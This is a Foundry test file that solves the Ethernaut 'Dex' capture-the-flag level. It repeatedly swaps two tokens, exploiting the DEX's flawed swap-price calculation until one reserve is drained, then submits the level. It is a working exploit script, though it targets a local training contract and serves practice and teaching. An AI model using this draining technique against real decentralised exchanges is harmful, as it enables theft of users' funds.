pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Dex } from "src/Dex/Dex.sol";
import { DexFactory } from "src/Dex/DexFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";
import "forge-std/console2.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address owner) external view returns (uint256);
}

contract DexTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testDexHack() external {
        // level setup
        DexFactory factory = new DexFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(me);
        vm.deal(me, 2 ether);
        address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(factory);
        Dex dex = Dex(payable(levelAddress));

        // attack
        IERC20 token1 = IERC20(dex.token1());
        vm.label(address(token1), "Token1");
        IERC20 token2 = IERC20(dex.token2());
        vm.label(address(token2), "Token2");

        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        // 10 in | 100 | 100 | 10 out
        // 24 out | 110 | 90 | 20 in
        // 24 in | 86 | 110 | 30 out
        // 41 out | 110 | 80 | 30 in
        // 41 in | 69 | 110 | 65 out
        // 110 out | 110 | 45 | 45 in
        // so the last amount in to take out all the 110 token 1 will be 45

        address[2] memory tokens = [address(token1), address(token2)];
        uint256[2] memory myBalances;
        uint256[2] memory dexBalances;
        

        uint256 fromIndex = 0;
        uint256 toIndex = 1;
        
        while (true) {
            myBalances = [
                IERC20(tokens[fromIndex]).balanceOf(me),
                IERC20(tokens[toIndex]).balanceOf(me)
            ];
            dexBalances = [
                IERC20(tokens[fromIndex]).balanceOf(address(dex)),
                IERC20(tokens[toIndex]).balanceOf(address(dex))
            ];
            
            uint256 amountOut = dex.get_swap_price(tokens[fromIndex], tokens[toIndex], myBalances[0]);
            if (amountOut > dexBalances[1]) {
                uint256 amountIn = dex.get_swap_price(tokens[toIndex], tokens[fromIndex], dexBalances[1]);
                dex.swap(tokens[fromIndex], tokens[toIndex], amountIn);    
                break;
            } else {

                dex.swap(tokens[fromIndex], tokens[toIndex], myBalances[0]);    
            }
            fromIndex = 1 - fromIndex;
            toIndex = 1 - toIndex;
        }

        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
